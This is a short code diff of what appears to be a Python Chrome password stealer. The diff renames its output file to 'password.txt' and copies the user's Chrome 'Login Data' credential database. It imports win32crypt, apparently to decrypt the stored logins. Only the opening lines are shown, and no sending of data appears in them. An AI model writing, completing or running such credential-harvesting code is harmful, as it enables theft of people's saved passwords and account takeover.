@@ -1,9 +1,9 @@
 import os, sqlite3, win32crypt, time, shutil, sys
-file = open("saksham.txt", "w")
+file = open("password.txt", "w")
 file.write("")
 file.close
 def logit(content):
-    file = open("saksham.txt", "a")
+    file = open("password.txt", "a")
     file.write(content)
     file.close
 shutil.copyfile(os.path.expanduser('~')+"/AppData/Local/Google/Chrome/User Data/Default/Login Data", "tempdatabase")
